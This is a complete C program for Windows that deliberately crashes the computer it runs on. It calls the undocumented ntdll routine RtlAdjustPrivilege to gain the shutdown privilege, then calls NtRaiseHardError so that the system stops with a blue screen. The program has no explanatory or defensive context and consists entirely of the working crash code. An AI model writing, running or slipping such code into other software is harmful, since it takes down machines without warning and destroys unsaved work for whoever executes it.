#include <Windows.h>

#pragma comment(lib, "ntdll.lib")
// Find the bsod service thing

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG ArgsNum, ULONG UnicodeMASK,
	PULONG_PTR Args, ULONG ValidResponse, PULONG Response
);

int main() {
	BOOLEAN intbool;
	unsigned long response;
	RtlAdjustPrivilege(19, true, false, &intbool);

	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

	return 0;
}